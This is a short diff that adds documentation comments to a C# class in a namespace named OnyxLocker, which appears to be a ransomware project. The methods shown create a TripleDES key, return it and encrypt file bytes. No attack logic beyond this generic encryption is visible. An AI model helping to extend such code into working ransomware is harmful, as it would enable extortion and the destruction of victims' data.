@@ -10,6 +10,10 @@ namespace OnyxLocker.Classes
 
         private byte[] EncryptionKey { get; set; }
 
+        /// <summary>
+        /// Fuction to create a 192bits encryption key
+        /// </summary>
+        /// <returns></returns>
         public byte[] CreateEncryptionKey()
         {
             var keyProvider = new TripleDESCryptoServiceProvider();
@@ -23,11 +27,21 @@ namespace OnyxLocker.Classes
             return key;
         }
 
+        /// <summary>
+        /// Returns the encryption key
+        /// </summary>
+        /// <returns></returns>
         public byte[] GetEncryptionKey()
         {
             return EncryptionKey;
         }
 
+        /// <summary>
+        /// Encrypts the given bytes with the key
+        /// </summary>
+        /// <param name="fileBytes">Bytes to encrypt</param>
+        /// <param name="encryptionKey">Encryption key</param>
+        /// <returns></returns>
         public byte[] EncryptBytes(byte[] fileBytes, byte[] encryptionKey)
         {
             try
